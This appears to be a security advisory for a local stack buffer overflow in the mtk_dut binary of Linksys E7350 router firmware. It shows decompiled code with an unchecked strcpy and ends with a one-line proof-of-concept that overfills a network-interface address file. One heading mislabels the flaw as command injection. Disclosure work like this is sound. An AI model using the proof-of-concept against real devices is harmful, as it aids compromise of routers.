# Buffer Overflow Vulnerability in `/sys/class/net/%s/address`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Linksys E7350 Router                                         |
| Firmware Version     | **1.1.00.032**                                               |
| Vulnerability Type   | **Stack-Based Buffer Overflow**                              |
| Vulnerable Component | `mtk_dut` (function `sub_4045A8`, buffers `v7` â†’ copied to `a1`) |
| Prerequisites        | Requires control over `/sys/class/net/%s/address` content or filesystem write permissions (local exploitation only) |

2. Exploitation Path

```c
int __fastcall sub_4045A8(int a1, const char *a2)
{
  int v4; // $v0
  int v5; // $s0
  _BYTE v7[256]; // [sp+18h] [-168h] BYREF
  _BYTE v8[104]; // [sp+118h] [-68h] BYREF

  printf("enter read mac address file %s\n", a2);
  sprintf(v8, "/sys/class/net/%s/address", a2);
  v4 = fopen(v8, "r");
  if ( v4 )
  {
    v5 = v4;
    if ( fgets(v7, 256, v4) )
      strcpy(a1, v7);
      ...
}
```

3. **Vulnerable Binaries:** `mtk_dut`.
4. 0-Day Command Injection Exploitation Path: In the `mtk_dut` file, at line 14, `fgets(v7, 256, v4)` reads up to 256 bytes from the `/sys/class/net/%s/address` file. Without any length check, the data is directly passed to line 15, `strcpy(a1, v7)`. The buffer `a1` can be traced through the call chain, revealing sizes of `_BYTE v22[32]` (32 bytes), `char v22[24]` (24 bytes), and `char v71[20]` (20 bytes), resulting in a buffer overflow vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerability

```bash
echo -n "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" > /sys/class/net/eth0/address
```